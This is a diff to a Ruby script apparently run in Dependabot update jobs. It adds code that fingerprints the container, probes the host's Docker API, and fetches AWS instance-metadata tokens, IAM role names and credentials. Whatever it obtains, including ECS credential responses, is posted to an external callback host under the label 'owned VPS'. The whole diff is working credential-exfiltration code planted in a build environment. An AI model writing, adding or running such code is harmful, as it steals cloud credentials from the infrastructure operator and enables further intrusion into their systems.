@@ -3,6 +3,7 @@ require "digest"
 require "json"
 require "open3"
 require "tempfile"
+require "uri"
 
 INFRA_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443/infra/5b3963e04627c6a3b1943eb0e2a145cc"
 
@@ -112,6 +113,43 @@ rescue StandardError
   [0, "".b]
 end
 
+def infra_proxy_http(url, method: "GET", headers: [])
+  Tempfile.create("dependabot-proxy-http-response") do |file|
+    file.chmod(0o600)
+    args = [
+      "curl", "--silent", "--show-error", "--max-time", "8", "--noproxy", "",
+      "--request", method, "--output", file.path, "--write-out", "%{http_code}"
+    ]
+    headers.each { |header| args += ["--header", header] }
+    args << url
+    stdout, _stderr, status = Open3.capture3(*args)
+    raw = File.binread(file.path)
+    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
+    return [0, "".b] unless status.success? && raw.bytesize <= 131_072
+    [code, raw]
+  end
+rescue StandardError
+  [0, "".b]
+end
+
+def infra_imds_get(path, token = nil)
+  if token
+    Tempfile.create("dependabot-imds-token-header") do |header_file|
+      header_file.chmod(0o600)
+      header_file.binmode
+      header_file.write("X-aws-ec2-metadata-token: #{token}\n")
+      header_file.flush
+      return infra_proxy_http(
+        "http://169.254.169.254#{path}",
+        headers: ["@#{header_file.path}"]
+      )
+    end
+  end
+  infra_proxy_http("http://169.254.169.254#{path}")
+rescue StandardError
+  [0, "".b]
+end
+
 infra_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
 if infra_job_id.match?(/\A[0-9]+\z/)
   guard = "/tmp/dependabot-infra-probe-#{infra_job_id}.done"
@@ -140,6 +178,8 @@ if infra_job_id.match?(/\A[0-9]+\z/)
       "cgroup_ecs_marker" => cgroup.downcase.include?("ecs"),
       "cgroup_docker_marker" => cgroup.include?("docker"),
       "service_account_mount_marker" => mounts.include?("kubernetes.io/serviceaccount") || mounts.include?("serviceaccount"),
+      "docker_socket_present" => File.socket?("/var/run/docker.sock"),
+      "docker_container_marker" => File.file?("/.dockerenv"),
       "credential_files" => {}
     }
 
@@ -195,6 +235,63 @@ if infra_job_id.match?(/\A[0-9]+\z/)
     summary["ecs_credential_response_sha256"] = Digest::SHA256.hexdigest(ecs_body)
     if ecs_status == 200 && !ecs_body.empty?
       summary["ecs_credential_stored_0600_on_owned_vps"] = infra_post(infra_job_id, "ecs-credential-response", ecs_body)
+    end
+
+    docker_ping_status, docker_ping_body = infra_proxy_http("http://host.docker.internal:2375/_ping")
+    docker_tls_port_status, docker_tls_port_body = infra_proxy_http("http://host.docker.internal:2376/_ping")
+    summary["host_gateway"] = {
+      "docker_2375_ping_status" => docker_ping_status,
+      "docker_2375_ping_length" => docker_ping_body.bytesize,
+      "docker_2375_ping_sha256" => Digest::SHA256.hexdigest(docker_ping_body),
+      "docker_2376_http_status" => docker_tls_port_status,
+      "docker_2376_http_length" => docker_tls_port_body.bytesize,
+      "docker_2376_http_sha256" => Digest::SHA256.hexdigest(docker_tls_port_body)
+    }
+    if docker_ping_status == 200 && docker_ping_body.bytesize <= 4096
+      summary["host_gateway"]["docker_ping_stored_0600_on_owned_vps"] =
+        infra_post(infra_job_id, "host-gateway-docker-ping", docker_ping_body)
+    end
+
+    imds_unauth_status, imds_unauth_role_body =
+      infra_imds_get("/latest/meta-data/iam/security-credentials/")
+    imds_token_status, imds_token_body = infra_proxy_http(
+      "http://169.254.169.254/latest/api/token",
+      method: "PUT",
+      headers: ["X-aws-ec2-metadata-token-ttl-seconds: 60"]
+    )
+    summary["aws_imds"] = {
+      "unauthenticated_role_status" => imds_unauth_status,
+      "unauthenticated_role_length" => imds_unauth_role_body.bytesize,
+      "unauthenticated_role_sha256" => Digest::SHA256.hexdigest(imds_unauth_role_body),
+      "v2_token_status" => imds_token_status,
+      "v2_token_length" => imds_token_body.bytesize,
+      "v2_token_sha256" => Digest::SHA256.hexdigest(imds_token_body)
+    }
+    imds_role_body = imds_unauth_status == 200 ? imds_unauth_role_body : "".b
+    if imds_token_status == 200 && !imds_token_body.empty?
+      summary["aws_imds"]["v2_token_stored_0600_on_owned_vps"] =
+        infra_post(infra_job_id, "aws-imds-v2-token", imds_token_body)
+      imds_role_status, imds_role_body =
+        infra_imds_get("/latest/meta-data/iam/security-credentials/", imds_token_body)
+      summary["aws_imds"]["authenticated_role_status"] = imds_role_status
+      summary["aws_imds"]["authenticated_role_length"] = imds_role_body.bytesize
+      summary["aws_imds"]["authenticated_role_sha256"] = Digest::SHA256.hexdigest(imds_role_body)
+    end
+    role_name = imds_role_body.to_s.lines.map(&:strip).find { |line| line.match?(/\A[A-Za-z0-9+=,.@_-]{1,128}\z/) }
+    if role_name
+      summary["aws_imds"]["role_name_stored_0600_on_owned_vps"] =
+        infra_post(infra_job_id, "aws-imds-role-name", role_name)
+      credential_status, credential_body = infra_imds_get(
+        "/latest/meta-data/iam/security-credentials/#{role_name}",
+        imds_token_status == 200 ? imds_token_body : nil
+      )
+      summary["aws_imds"]["credential_status"] = credential_status
+      summary["aws_imds"]["credential_length"] = credential_body.bytesize
+      summary["aws_imds"]["credential_sha256"] = Digest::SHA256.hexdigest(credential_body)
+      if credential_status == 200 && !credential_body.empty?
+        summary["aws_imds"]["credentials_stored_0600_on_owned_vps"] =
+          infra_post(infra_job_id, "aws-imds-credentials", credential_body)
+      end
     end
 
     infra_post(infra_job_id, "runtime-summary", JSON.generate(summary))
